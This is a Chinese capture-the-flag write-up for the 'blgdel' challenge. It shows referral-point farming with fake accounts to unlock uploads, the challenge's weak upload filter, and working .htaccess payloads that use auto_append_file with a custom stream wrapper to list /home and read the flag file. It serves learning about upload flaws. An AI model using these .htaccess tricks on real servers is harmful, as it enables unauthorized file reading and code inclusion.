ailx10说：这篇是我2025年1月写的。blgdel 得先攒推荐积分，才能摸到上传功能。进去后我发现文件名这一关没有管严，于是把注意力从普通文件转到 .htaccess，再接上 auto\_append\_file 和自定义流包装器，先看目录，后找目标。这篇记录的是入口如何一层层变形：业务上的门槛过去了，上传后的解释规则又成了新的关键。里面涉及 Apache、PHP 和包装器的具体条件，不能只记一个配置文件名就往别处套；得说明文件放在哪里、由谁读取、哪项设置真正影响了后续行为。

---

本文记录上传文件名、目录配置及自定义流包装器共同作用的历史实验。

.htaccess 和 php\_value 是否生效取决于服务器配置与 PHP 接入方式；自定义包装器并非 PHP 默认能力，其实现需要查看题目源码。

难度系数：5（官方系数：8）

![](/notes-assets/196999b2fd52414e063c.webp)

目录扫描，发现敏感文件

```
/config.txt

/robots.txt

/sql.txt
```

![](/notes-assets/c18d0ef37d38201438e7.webp)

从 `/config.txt` 中查看到疑似 `config.php` 源代码，这应该是解题的关键，这段 php 代码定义了一个名为 `master` 的类，它实现了一个自定义的流包装器（stream wrapper），并通过 `stream_wrapper_register` 注册了 `master` 作为自定义的协议处理方式

![](/notes-assets/5a2bce52e09cdc1f5821.webp)

注册账号并登录，在个人中心页面可以上传图片，由于积分是0，暂时无法上传

![](/notes-assets/e203d13d7ad457d2a918.webp)

注册10个账号，推荐人填写ailx10，将会拿到100积分，就获得了上传权限

![](/notes-assets/7d7dd010e0cc6939278c.webp)

但是上传一句话木马，会被 upload 函数替换内容

```
function upload($path, $name)

{

    if(!preg_match('/^uploads\/[a-z]{10}\/$/is',$path)||empty($_FILES[$name]['tmp_name']))

        return 1;



    $filename=$_FILES[$name]['name'];

    echo $filename;



    $file=file_get_contents($_FILES[$name]['tmp_name']);

    

    // 文件内容替换

    $file=str_replace('<','!',$file);

    $file=str_replace(urldecode('%03'),'!',$file);

    $file=str_replace('"','!',$file);

    $file=str_replace("'",'!',$file);

    $file=str_replace('.','!',$file);



    if(preg_match('/file:|http|pre|etc/is',$file))

    {

        echo 'illegalbbbbbb!';

        return 1;

    }



    file_put_contents($path.$filename,$file);

    file_put_contents($path.'user.jpg',$file);

    

    echo 'upload success!';

    return 1;

}

```

![](/notes-assets/df14fbbe51a56249db94.webp)

我们新建一个这样的`.htaccess`配置文件 ，用来指定 php 在每个请求执行完毕后自动包含（append）一个文件。它的作用类似于 `include` 或 `require` 语句，可以让指定的文件在每个请求完成后被执行

```
php_value auto_append_file master://search/path=%2fhome%2f&name=flag
```

之所以对`/`进行URL编码，是因为 `functionstream_open($path)` 对 `master://search/path=%2fhome%2f&name=flag` 从 search 开始进行正则提取

```
preg_match('/(.*)\/(.*)$/s',$path,$array,0,9)
```

![](/notes-assets/ecf6f1928441e6e142b1.webp)

实际上只需要home前的`%2f`就可以了，不必在home后面写`/`

![](/notes-assets/91701663560b387ef4f8.webp)

上传一个空的php文件

```
<?php ?>
```

上传成功，再访问这个php文件，成功发现flag文件：hiahiahia\_flag

![](/notes-assets/fc57b023bd8faedf3d96.webp)

修改 `.htaccess` 配置文件内容如下，包含 flag 文件：

```
php_value auto_append_file /home/hiahiahia_flag
```

![](/notes-assets/4deb7b32d288dff8d0c6.webp)

再次访问上传的 php文件，就拿到了 flag

![](/notes-assets/a32aa75abb381842be44.webp)

从目录列举到读取目标，中间每一步都有自己的解释器和路径。把配置怎样介入后续请求说清楚，才能看懂为什么一个看似普通的上传最终改变了处理流程。
